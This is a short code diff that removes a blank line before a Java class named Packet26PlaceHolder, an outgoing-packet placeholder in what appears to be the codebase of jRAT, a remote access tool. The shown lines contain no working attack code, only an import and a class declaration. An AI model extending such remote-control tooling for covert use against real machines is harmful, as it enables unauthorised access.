@@ -4,7 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet26PlaceHolder extends AbstractOutgoingPacket {
 
 	@Override
